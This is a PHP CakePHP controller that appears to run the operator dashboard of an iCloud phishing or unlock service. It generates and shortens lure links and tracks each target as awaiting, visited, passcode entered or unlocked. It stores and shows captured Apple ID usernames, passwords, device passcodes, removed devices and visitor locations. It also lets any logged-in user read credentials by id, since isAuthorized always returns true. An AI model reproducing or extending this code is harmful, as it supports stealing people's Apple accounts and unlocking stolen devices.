<?php
App::uses('CakeTime','Utility');
class GeneratedLinksController extends AppController {
	public $components = array('DatabaseFunction', 'ConditionBuilder');
	public $default_conditions = array();
	
	public function index() {
		$data =  $this->get_orders(array());
		$this->set('data',$data['data']);
		if(isset($this->request->query['layout']) && $this->request->query['layout']=='ajax'){
			$this->autoRender = false;
			echo json_encode($data);
		}
	}
	
	public function delete_link($id) {
		
		$default_conditions = array();
		if($this->Auth->user('role')!=='Administrator'){
			$default_conditions = array('GeneratedLink.created_by' => $this->Auth->user('id'));
		}
		
		$this->autoRender = false;
		$this->loadModel('Script');
		$this->DatabaseFunction->delete_record(
			$this->GeneratedLink, 
			$id,
			true,
			'Link',
			array(),
			array(),
			$default_conditions
		);
	}
	
	public function block_link($id) {
		
		$default_conditions = array();
		if($this->Auth->user('role')!=='Administrator'){
			$default_conditions = array('GeneratedLink.created_by' => $this->Auth->user('id'));
		}
		
		$this->autoRender = false;
		$this->loadModel('Script');
		$this->DatabaseFunction->disable_record(
			$this->GeneratedLink, 
			$id,
			true,
			'Link',
			array(),
			array(),
			$default_conditions
		);
	}
		
	public function revive_link($id) {
		if($this->Auth->user('role')!=='Administrator'){
			$response['success'] = false;
			$response['msg'] = 'Warning, You are not allowed to access this page!';
			echo json_encode($response);
			exit();
		}
		
		$this->autoRender = false;
		$this->loadModel('Script');
		$this->DatabaseFunction->enable_record(
			$this->GeneratedLink, 
			$id,
			true,
			'Link',
		);
	}
	
	public function delete_selected_link(){
		$id = $this->request->data['id'] ?? array();
		$id = (!is_array($id) ? json_decode($id,true) : $id);
		
		$this->autoRender = false;
		$this->loadModel('GeneratedLink');
		$this->DatabaseFunction->delete_record(
			$this->GeneratedLink, 
			$id,
			true,
			'Link'
		);
	}

	public function enable_selected_link(){
		if($this->Auth->user('role')!=='Administrator'){
			$response['success'] = false;
			$response['msg'] = 'Warning, You are not allowed to access this page!';
			echo json_encode($response);
			exit();
		}
		
		$id = $this->request->data['id'] ?? array();
		$id = (!is_array($id) ? json_decode($id,true) : $id);
		
		$this->autoRender = false;
		$this->loadModel('GeneratedLink');
		$this->DatabaseFunction->enable_record(
			$this->GeneratedLink, 
			$id,
			true,
			'Link'
		);
	}

	public function disable_selected_link(){
		$id = $this->request->data['id'] ?? array();
		$id = (!is_array($id) ? json_decode($id,true) : $id);
		
		$this->autoRender = false;
		$this->loadModel('GeneratedLink');
		$this->DatabaseFunction->disable_record(
			$this->GeneratedLink, 
			$id,
			true,
			'Link'
		);
	}
	
	public function view_account($id) {
		$this->autoRender = false;
		$response = array();
		
		$this->GeneratedLink->virtualFields =array(
			'passcode'=>"SELECT CONCAT(GROUP_CONCAT(DISTINCT generated_link_logs.log_description SEPARATOR ' OR ')) from generated_link_logs WHERE generated_link_logs.log_type ='passcode' and generated_link_logs.link_id = GeneratedLink.id",
		);
		$data = $this->GeneratedLink->find('first',array(
			'fields'=>array(
				'GeneratedLink.username',
				'GeneratedLink.password',
				'GeneratedLink.passcode',
			),
			'conditions'=>array(
				'GeneratedLink.id' => $id
			),
			'recursive'=>-1
		));
		
		if(count($data) > 0){
			$response['success'] = true;
			$response = array_merge($data['GeneratedLink'],$response);
		}else{
			$response['success'] = false;
			$response['msg'] = 'Link not found!';
		}
		
		echo json_encode($response);
	}
	
	public function view_devices($id) {
		$this->autoRender = false;
		$response = array();

		$data = $this->GeneratedLink->find('first',array(
			'fields'=>array(
				'GeneratedLink.removed_devices',
			),
			'conditions'=>array(
				'GeneratedLink.id' => $id
			),
			'recursive'=>-1
		));
		
		if(count($data) > 0){
			$response['success'] = true;
			$response = array_merge($data['GeneratedLink'],$response);
		}else{
			$response['success'] = false;
			$response['msg'] = 'Link not found!';
		}
		
		echo json_encode($response);
	}
	
	public function awaiting_orders() {
		$default_conditions=array('GeneratedLink.visited' =>0,'GeneratedLink.is_proccessed' =>0,'GeneratedLink.passcode_attempt <= 0');
		$data =  $this->get_orders($default_conditions);
		$this->set('data',$data['data']);
		if(isset($this->request->query['layout']) && $this->request->query['layout']=='ajax'){
			$this->autoRender = false;
			echo json_encode($data);
		}
	}
	
	public function visited_orders() {
		$default_conditions=array('GeneratedLink.visited' =>1,'GeneratedLink.is_proccessed' =>0,'GeneratedLink.passcode_attempt <= 0');
		$data =  $this->get_orders($default_conditions);
		$this->set('data',$data['data']);
		if(isset($this->request->query['layout']) && $this->request->query['layout']=='ajax'){
			$this->autoRender = false;
			echo json_encode($data);
		}
	}
	
	public function passcode_orders() {
		$default_conditions=array('GeneratedLink.visited' =>1,'GeneratedLink.is_proccessed' =>0,'GeneratedLink.passcode_attempt > 0');
		$data =  $this->get_orders($default_conditions);
		$this->set('data',$data['data']);
		if(isset($this->request->query['layout']) && $this->request->query['layout']=='ajax'){
			$this->autoRender = false;
			echo json_encode($data);
		}
	}
	
	public function unlocked_orders() {
		$default_conditions=array('GeneratedLink.is_proccessed' =>1);
		$data =  $this->get_orders($default_conditions);
		$this->set('data',$data['data']);
		if(isset($this->request->query['layout']) && $this->request->query['layout']=='ajax'){
			$this->autoRender = false;
			echo json_encode($data);
		}
	}
	
	private function get_orders($submitted_conditions = array()) {
	    
		if($this->Auth->user('role')!=='Administrator'){
			$this->default_conditions = array_merge($this->default_conditions, array('GeneratedLink.created_by' => $this->Auth->user('id')));
		}
	    
		$this->default_conditions = array_merge($this->default_conditions, $submitted_conditions);
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_string_equivalent('GeneratedLink.id', 'id'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_wildcard('GeneratedLink.name', 'name'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_wildcard('GeneratedLink.web', 'web'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_wildcard('GeneratedLink.web', 'folder'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_wildcard('GeneratedLink.map', 'map'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_wildcard('GeneratedLink.status', 'status'));
		
		$this->default_conditions = array_merge($this->default_conditions, $submitted_conditions);
		
		
		
		$pagination_fields = array();

		$pagination_fields_reorder = array(
			'GeneratedLink.id',
			'Script.name',
			'GeneratedLink.link',
			'GeneratedLink.shorten_link',
			'GeneratedLink.notes',
			'GeneratedLink.status',
			'LinkOwner.username',
			'GeneratedLink.visited',
			'GeneratedLink.is_proccessed',
			'GeneratedLink.passcode_attempt',
			'GeneratedLink.passcode',
			'GeneratedLink.username',
			'GeneratedLink.password',
			'GeneratedLink.created',
		);
		
		$this->GeneratedLink->virtualFields =array(
			'passcode'=>"SELECT CONCAT('<b>',GROUP_CONCAT(DISTINCT generated_link_logs.log_description SEPARATOR '</b> OR <b>'),'</b>') from generated_link_logs WHERE generated_link_logs.log_type ='passcode' and generated_link_logs.link_id = GeneratedLink.id",
		);
		
		$searchable_fields = array(
			'Script.name',
			'GeneratedLink.link',
			'GeneratedLink.shorten_link',
			'GeneratedLink.notes',
			'GeneratedLink.status',
			'LinkOwner.username',
			'GeneratedLink.username',
			'GeneratedLink.password',
		);
		
		$default_order = array('GeneratedLink.id'=>'DESC');
		$default_contain = array(
			'Script',
			'LinkOwner'
		);
		$default_conditions = array();
		$default_joins = array();
		$default_group = array();
		$default_recursive = -1;
		
		$this->loadModel('GeneratedLink');
		$data = $this->DatabaseFunction->get_data_table_ajax_records(
			$this->GeneratedLink,
			$pagination_fields,
			$pagination_fields_reorder,
			$searchable_fields,
			array(),
			array(),
			$default_contain,
			$this->default_conditions,
			$default_order,
			$default_recursive,
			$default_joins,
			$default_group,
			true
		);
		
		// debug($data);
		// exit();
		
		$display_array = array();
		foreach($data['data'] as $list_key => $list_value) {
			$id = $list_value['GeneratedLink.id'];
			
			$is_visited = $list_value['GeneratedLink.visited'];
			$is_proccessed = $list_value['GeneratedLink.is_proccessed'];
			$passcode_attempt =$list_value['GeneratedLink.passcode_attempt'];
			
			$appleid = $list_value['GeneratedLink.username'];
			$password = $list_value['GeneratedLink.password'];
			$passcode = $list_value['GeneratedLink.passcode'];
			
			$link_owner =$list_value['LinkOwner.username'];
			$created = $list_value['GeneratedLink.created'];
			$link = $list_value['GeneratedLink.link'];
			$short_link = $list_value['GeneratedLink.shorten_link'];
			$notes = $list_value['GeneratedLink.notes'];
			$script = $list_value['Script.name'];
			$link_status = $list_value['GeneratedLink.status'];
			
			$view_unlocked = "";
			$view_icloud_account = "";
			if($is_proccessed){
				$status = '<span class="mb-1 badge bg-success">Success</span>';
				$view_unlocked = '<a href="#" data-id="'.$id.'" class="view_unlocked btn mb-1 waves-effect waves-light btn-outline-success w-100" >View Unlocked</a>';
				$view_icloud_account = '<a href="#" data-id="'.$appleid.'" data-pwd="'.$password.'" data-passcode="'.$passcode.'" class="view_icloud_account btn mb-1 waves-effect waves-light btn-outline-primary w-100">Account Info</a>';
			}else if($passcode_attempt >=1){
				$status = '<span class="mb-1 badge bg-info">Passcode</span>';
			}else if($is_visited >=1){
				$status = '<span class="mb-1 badge bg-warning">Visited</span>';
			}else{
				$status = '<span class="mb-1 badge bg-danger">Awaiting</span>';
			}
			
			if($link_status == 0){
				$status = '<span class="mb-1 badge bg-muted">Blocked</span>';
			}
			
			$display_array[$list_key]['GeneratedLink.id'] = $id;
			$display_array[$list_key]['GeneratedLink.status_desc'] = $status;
			$display_array[$list_key]['GeneratedLink.script'] = $script;
			$display_array[$list_key]['GeneratedLink.short_link'] = '<a title="Click To Browse" style="color:#0c9597;" target="_blank" href="'. $short_link.'">'.$short_link.'</a>';
			$display_array[$list_key]['GeneratedLink.notes'] = $notes;
			$display_array[$list_key]['GeneratedLink.age'] = CakeTime::timeAgoInWords($created);
			$display_array[$list_key]['GeneratedLink.owner'] = $link_owner;
		}
		
		$data['data'] = $display_array;

		return $data;

	}
	
	private function get_logs($submitted_conditions = array()) {
		$this->default_conditions = array_merge($this->default_conditions, $submitted_conditions);
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_string_equivalent('GeneratedLinkLog.id', 'id'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_wildcard('GeneratedLinkLog.name', 'name'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_wildcard('GeneratedLinkLog.web', 'web'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_wildcard('GeneratedLinkLog.web', 'folder'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_wildcard('GeneratedLinkLog.map', 'map'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_wildcard('GeneratedLinkLog.status', 'status'));
		
		$this->default_conditions = array_merge($this->default_conditions, $submitted_conditions);
		
		
		
		$pagination_fields = array();

		$pagination_fields_reorder = array(
			'GeneratedLinkLog.id',
			'GeneratedLinkLog.link_id',
			'GeneratedLinkLog.created',
			'GeneratedLinkLog.log_type',
			'Script.name',
			'GeneratedLinkLog.log_description',
			'GeneratedLinkLog.visitor_country',
			'GeneratedLinkLog.visitor_city',
			'GeneratedLinkLog.visitor_browser',
			'GeneratedLinkLog.removed_devices',
			'GeneratedLink.visited',
			'GeneratedLink.is_proccessed',
		);
		
		// $this->GeneratedLinkLog->virtualFields =array(
			// 'passcode'=>"SELECT CONCAT('<b>',GROUP_CONCAT(DISTINCT generated_link_logs.log_description SEPARATOR '</b> OR <b>'),'</b>') from generated_link_logs WHERE generated_link_logs.log_type ='passcode' and generated_link_logs.link_id = GeneratedLinkLog.id",
		// );
		
		$searchable_fields = array(
			'GeneratedLinkLog.id',
			'GeneratedLinkLog.link_id',
			'GeneratedLinkLog.created',
			'GeneratedLinkLog.log_type',
			'Script.name',
			'GeneratedLinkLog.log_description',
			'GeneratedLinkLog.visitor_country',
			'GeneratedLinkLog.visitor_city',
			'GeneratedLinkLog.visitor_browser',
			'GeneratedLinkLog.removed_devices',
			'GeneratedLink.visited',
			'GeneratedLink.is_proccessed',
		);
		
		$default_order = array('GeneratedLinkLog.id'=>'DESC');
		$default_contain = array(
			'Script',
			'GeneratedLink'=>array(
				'fields'=>array(
					'GeneratedLink.id',
					'GeneratedLink.visited',
					'GeneratedLink.is_proccessed',
				)
			)
		);
		$default_conditions = array();
		$default_joins = array();
		$default_group = array();
		$default_recursive = -1;
		
		$this->loadModel('GeneratedLinkLog');
		$data = $this->DatabaseFunction->get_data_table_ajax_records(
			$this->GeneratedLinkLog,
			$pagination_fields,
			$pagination_fields_reorder,
			$searchable_fields,
			array(),
			array(),
			$default_contain,
			$this->default_conditions,
			$default_order,
			$default_recursive,
			$default_joins,
			$default_group,
			true
		);
		
		$display_array = array();
		foreach($data['data'] as $list_key => $list_value) {
			
			$id = $list_value['GeneratedLinkLog.link_id'];
			$is_proccessed = $list_value['GeneratedLink.is_proccessed'];
			$description = $list_value['GeneratedLinkLog.log_description'];
			
			if($list_value['GeneratedLinkLog.log_type']=="passcode"){
				$description = "Input Passcode: " . $list_value['GeneratedLinkLog.log_description'];
			}
			
			$display_array[$list_key]['GeneratedLinkLog.id'] = $list_value['GeneratedLinkLog.id'];
			$display_array[$list_key]['GeneratedLinkLog.created'] = CakeTime::timeAgoInWords($list_value['GeneratedLinkLog.created']);
			$display_array[$list_key]['Script.name'] = $list_value['Script.name'];
			$display_array[$list_key]['GeneratedLinkLog.description'] = $description;
			$display_array[$list_key]['GeneratedLinkLog.location'] = $list_value['GeneratedLinkLog.visitor_city'].', '.$list_value['GeneratedLinkLog.visitor_country'];
			$display_array[$list_key]['GeneratedLinkLog.browser'] = $list_value['GeneratedLinkLog.visitor_browser'];
		}
				
		// debug($display_array);
		// exit();
		
		
		$data['data'] = $display_array;

		return $data;

	}
	
	public function view_logs($id) {
		$data = $this->GeneratedLink->find('first',array(
			'fields'=>array(
				'GeneratedLink.link',
				'GeneratedLink.visited',
				'GeneratedLink.is_proccessed',
				'GeneratedLink.passcode_attempt',
				'GeneratedLink.status',
			),
			'conditions'=>array(
				'GeneratedLink.id' => $id
			),
			'recursive'=>-1
		));
		
		$link = $data['GeneratedLink']['link'] ?? '';
		$is_visited = $data['GeneratedLink']['visited'] ?? false;
		$is_proccessed = $data['GeneratedLink']['is_proccessed'] ?? false;
		$passcode_attempt =$data['GeneratedLink']['passcode_attempt'] ?? 0;
		$link_status = $data['GeneratedLink']['status'];
		
		if($is_proccessed){
			$status = '<span class="btn waves-effect waves-light btn-success fs-3">Success</span>';
		}else if($passcode_attempt >=1){
			$status = '<span class="btn waves-effect waves-light btn-info fs-3">Passcode</span>';
		}else if($is_visited >=1){
			$status = '<span class="btn waves-effect waves-light btn-warning fs-3">Visited</span>';
		}else{
			$status = '<span class="btn waves-effect waves-light btn-danger fs-3">Awaiting</span>';
		}
		
		if($link_status == 0){
			$status = '<span class="btn waves-effect waves-light btn-muted fs-3">Blocked</span>';
		}
		
		$this->set('link',$link);
		$this->set('status',$status);
		
		$default_conditions=array('GeneratedLinkLog.link_id'=>$id);
		$data =  $this->get_logs($default_conditions);
		$this->set('data',$data['data']);
		if(isset($this->request->query['layout']) && $this->request->query['layout']=='ajax'){
			$this->autoRender = false;
			echo json_encode($data);
		}
	}
	
	
	public function isAuthorized($user) {
		return true;
	}

}
?>